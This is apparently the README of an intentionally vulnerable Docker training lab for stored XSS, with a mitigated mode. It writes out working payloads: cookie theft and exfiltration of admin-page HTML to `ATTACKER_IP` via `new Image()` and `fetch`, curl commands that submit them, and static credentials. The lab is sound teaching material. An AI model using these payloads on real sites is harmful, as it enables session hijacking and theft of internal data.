# Dalfox XSS Lab

Stored XSS / second-order XSS laboratory for isolated demonstrations with Docker Compose, Nginx, Node.js, PostgreSQL, Playwright, and a manual Python collector.

This repository starts in intentionally vulnerable mode. Use it only in a controlled environment that you own.

## What This Lab Demonstrates

1. A public form on `cross.fit` stores attacker-controlled content.
2. An internal admin panel on `backend.cross.fit` later renders that content.
3. A privileged browser session can become the bridge to an internal system even when the attacker cannot reach that backend directly.
4. Mitigations such as contextual output escaping, `HttpOnly`, and CSP reduce or block exploitation.

## Architecture

Services:

- `public-proxy`: only published entrypoint on host port `80`
- `public-app`: public gym landing page and contact form
- `internal-proxy`: Docker-only reverse proxy for `backend.cross.fit`
- `internal-app`: internal admin panel
- `worker`: Playwright browser logged in as admin
- `db`: PostgreSQL 16

Trust boundary:

- `cross.fit` is reachable from the attacker machine.
- `backend.cross.fit` is only resolvable inside Docker through the `internal-proxy` alias.
- The attacker should not be able to browse `backend.cross.fit` directly through the exposed port.

## Repository Layout

```text
.
├── docker-compose.yml
├── db/
├── nginx/
├── public-app/
├── internal-app/
├── worker/
├── tools/
└── docs/project_notes/
```

## Requirements

- Docker Engine + Docker Compose plugin
- `curl`
- Python 3
- Optional: Dalfox on the attacker machine

## Local Domains

### Attacker machine

Add only this mapping:

```text
192.168.56.10   cross.fit
```

Do not add:

```text
192.168.56.10   backend.cross.fit
```

### Single-host validation note

During the validation performed in this repository, the collector was tested from the Docker network using `172.28.0.1` as the host gateway. That is only a local convenience for same-host testing.

In the intended two-machine lab, replace `ATTACKER_IP` with the real IP of the attacker machine, for example `192.168.56.20`.

## Configuration

Copy `.env.example` to `.env` if you want persistent local overrides:

```bash
cp .env.example .env
```

Supported variables:

- `LAB_MODE=vulnerable|mitigated`
- `COOKIE_HTTPONLY=` optional explicit override
- `ENABLE_CSP=` optional explicit override
- `RENDER_UNSAFE_HTML=` optional explicit override
- `POLL_INTERVAL_SECONDS=20`

Behavior:

- `vulnerable`:
  - raw HTML rendering enabled
  - `HttpOnly=false`
  - CSP disabled
- `mitigated`:
  - escaped output enabled
  - `HttpOnly=true`
  - CSP enabled

## Start The Lab

```bash
docker compose up --build -d
```

Check status:

```bash
docker compose ps
```

Expected:

- `public-proxy` published on `0.0.0.0:80`
- `public-app`, `internal-app`, `internal-proxy`, `db`, and `worker` running
- no published host ports for `3000`, `3001`, or `5432`

## Infrastructure Validation

### Public entrypoint

```bash
curl -i http://cross.fit/
```

Expected: landing page for `CrossFit Atlas`.

### Backend isolation

```bash
curl -i -H "Host: backend.cross.fit" http://192.168.56.10/
```

Expected: connection closed, empty reply, or a non-success response. The internal backend must not be reachable through the published port.

### Worker access to internal backend

```bash
docker compose exec -T worker wget -S -O- http://backend.cross.fit/login
```

Expected: `200 OK`.

## Public App Flow

Open:

```text
http://cross.fit
```

Submit the contact form with:

- `full_name`
- `email`
- optional `phone`
- `message`

The `message` field is intentionally stored without sanitization in vulnerable mode.

## Start The Collector

Run this on the attacker machine:

```bash
python3 tools/collector.py
```

It listens on:

```text
0.0.0.0:9000
```

## Short Presentation Flow

If you want a quick first demo before showing cookie theft or HTML exfiltration, use a plain Python HTTP server on the attacker machine.

Start it with:

```bash
python3 -m http.server 8000
```

Expected:

- the terminal prints a log line for every HTTP request received
- no extra code is needed on the attacker side

Suggested opening narrative:

1. Show that the public landing includes a hint that messages are reviewed in `backend.cross.fit`.
2. Start `python3 -m http.server 8000` on the attacker machine.
3. Submit a contact message with a minimal XSS payload that makes a request to that HTTP server.
4. Wait for the worker to process the message.
5. Show the request appearing in the Python server log.

This confirms that the JavaScript executed in the privileged browser session tied to `backend.cross.fit`.

## Payloads

Replace `ATTACKER_IP` with the attacker machine IP.

### Probe request to a manual Python HTTP server

Use this first if you only want to prove code execution against the internal backend:

```html
<img src=x onerror="new Image().src='http://ATTACKER_IP:8000/ping'">
```

Same-host validation shortcut:

```html
<img src=x onerror="new Image().src='http://172.28.0.1:8000/ping'">
```

Expected on the attacker machine with `python3 -m http.server 8000`:

```text
"GET /ping HTTP/1.1" 404 -
```

The `404` is fine. What matters is that the request reached the attacker-controlled server.

### Visual XSS

```html
<script>alert('XSS ejecutado en backend.cross.fit')</script>
```

Expected:

- the script executes in the privileged Playwright browser
- the worker logs the dialog event

### Cookie theft

```html
<img src=x onerror="new Image().src='http://ATTACKER_IP:9000/collect?c='+encodeURIComponent(document.cookie)">
```

Expected in vulnerable mode:

- `collector.py` receives `GET /collect`
- the query contains `gym_internal_session=...`

### Internal HTML exfiltration

```html
<script>
fetch('/admin/messages', { credentials: 'include' })
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://ATTACKER_IP:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Expected in vulnerable mode:

- `collector.py` receives `POST /internal-html`
- the body decodes to the HTML of `/admin/messages`

## Submit Payloads With curl

### Legitimate message

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Juan Perez" \
  -d "email=juan@example.com" \
  -d "phone=099123456" \
  -d "message=Quiero informacion sobre planes mensuales"
```

### Cookie payload

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS" \
  -d "email=xss@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://ATTACKER_IP:9000/collect?c='+encodeURIComponent(document.cookie)\">"
```

### Probe request to Python HTTP server

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Probe" \
  -d "email=xss-probe@example.com" \
  -d "phone=099000009" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://ATTACKER_IP:8000/ping'\">"
```

### HTML exfiltration payload

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS 2" \
  -d "email=xss2@example.com" \
  -d "phone=099000001" \
  --data-urlencode "message=<script>fetch('/admin/messages', { credentials: 'include' }).then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://ATTACKER_IP:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
```

## Worker Behavior

The worker intentionally behaves like a real privileged user:

1. Opens `http://backend.cross.fit/login`
2. Logs in as `admin`
3. Visits `/admin/messages/next`
4. Waits for the page to render
5. Marks the message as processed

Logs:

```bash
docker compose logs -f worker
```

## Dalfox

Primary scenario:

```bash
dalfox url "http://cross.fit/contact" \
  -X POST \
  -d "full_name=Test&email=test@example.com&phone=123&message=INJECT_HERE"
```

Notes:

- this repository does not include the optional `/preview` helper route
- the core exercise focuses on the stored XSS chain, not a reflected helper

## Mitigation Mode

Switch the lab to mitigated mode:

```bash
LAB_MODE=mitigated docker compose up -d --build internal-app worker
```

Mitigated behavior:

- message detail renders escaped content instead of raw HTML
- session cookie is `HttpOnly`
- CSP blocks inline scripts and inline event handlers

## Validate The Mitigation

1. Start a fresh `collector.py`.
2. Switch to mitigated mode.
3. Submit the same payloads again.
4. Watch the worker logs.
5. Confirm the collector receives nothing.

Expected:

- the worker still processes the message
- the payload appears as text in the internal detail view
- no cookie theft reaches the collector
- no `/internal-html` POST reaches the collector

## Shutdown

```bash
docker compose down -v
```

## Notes About Intentional Insecurity

This repository intentionally includes:

- stored attacker-controlled HTML in the public form flow
- a vulnerable raw HTML sink in the admin detail page when `LAB_MODE=vulnerable`
- static lab credentials (`admin/admin123`)
- non-`HttpOnly` session cookies in vulnerable mode

These choices exist only for the lab scenario.

## References

- OWASP Cross-Site Scripting:
  `https://owasp.org/www-community/attacks/xss/`
- OWASP XSS Prevention Cheat Sheet:
  `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`
- MDN Cookies / HttpOnly:
  `https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies`
- Docker Compose Networking:
  `https://docs.docker.com/compose/how-tos/networking/`
- Nginx access controls:
  `https://nginx.org/en/docs/http/ngx_http_access_module.html`
